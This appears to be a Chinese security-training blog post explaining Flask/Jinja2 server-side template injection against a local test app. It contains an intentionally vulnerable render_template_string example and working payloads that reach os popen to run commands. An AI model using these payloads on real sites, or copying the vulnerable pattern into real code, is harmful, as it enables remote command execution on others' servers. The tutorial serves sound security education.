<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SplqDpOz-cY8tuJ7rWYbzw)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

本文由掌控安全学院 - s_s 投稿

  

##### 0x01:flask 是基于 python 开发的一个轻量级 web 应用，可以用来搭建 web 环境。

安装 flask 框架命令：

```
pip install flask


```

##### 0x02: 漏洞环境代码分析：

render_template_string3.py（这里是我自己给测试文件的命名）:

```
from flask import Flask,render_template_string, request

app=Flask(__name__)

<span>@app.route('/test')#CTL{n}def</span> test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)

if __name__ =='__main__':
    app.run()


```

没有接触过 flask 框架的小伙伴看到可能会有点懵，简单分析一下，运行这个 py 文件就会启动 web 服务，默认在本机的 5000 端口，<span>@app.route(‘/test’)?</span>?? 作用是找路由，这里是 http://127.0.0.1:5000/test 路径。code = request.args.get(‘id’) 的意思是把 get 传参过来的 id 字段赋值给变量 code。

最核心的地方就是 rendet_template_string() 函数，这个可以渲染前端输出，这里是把 code 的值在前端格式化输出了。

```
html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)


```

##### 0x03: 接下来需要了解一个知识点，flask 使用的是 jinja2 的渲染方法，渲染的时候 \{\{\}\} 可以解析包含的内容。如：

```
from flask import Flask,render_template_string, request

app=Flask(__name__)

<span>@app.route('/aaaaa')#CTL{n}def</span> index():
    content = request.args.get("content")
    return render_template_string(content)


if __name__ =='__main__':
    app.run()


```

访问 http://127.0.0.1:5000/aaaaa?content=1，页面会显示 1

访问 http://127.0.0.1:5000/aaaaa?content=\{\{2*2\}\}，页面会显示 4

很明显，这里的传参被执行了，说明我们可以进行注入了。

##### 0x04: 实行文件读写和命令执行的基本操作：获取基本类 -> 获取基本类的子类 -> 在子类中找到关于命令执行和文件读写的模块

在 python 中，object 类是 Python 中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承 object 类。我们从这段话出发，假定你已经知道 ssti 漏洞了，但是完全没学过 ssti 代码怎么写，接下来你可能会学到一点废话。

```
"".__class__ 意思是空字符串的基类，是str
"".__class__.__mro__  mro给出了method resolution order，即解析方法调用的顺序,可以得到object类
"".__class__.__bases__[0].__subclasses__()  subclasses是返回该类的所有子类的集合
举个例子，我们想要命令执行，就需要找到os函数，Ctrl+F找到了，再__init__.__globals__，这里init初始化类，然后globals全局来查找所有的方法及变量及参数。


```

到这里 poc 为

```
http://127.0.0.1:5000/test?id={\{\%27%27.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__\}\}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqhXuxyNDRbfI1WutEZdTOD3YyXRGKBuc34ohiaqwtDUxbQ8IpialViakp5Qx9gD9QNP0ngvey2jJDCg/640?wx_fmt=png)

此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的 function popen，在 python2 中可找 file 读取文件，很多可利用方法，详情可百度了解下。

最终 poc 为：

```
http://127.0.0.1:5000/test?id={\{\%27%27.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__[%27popen%27](%27dir%27).read()\}\}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqhXuxyNDRbfI1WutEZdTOD2pVdzzibLtq6cPLvKZwNhwekXXqt9EnZqf24WwVCuEEBtpytgeohnyA/640?wx_fmt=png)

这里我们执行了 dir 命令，得到了回显。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力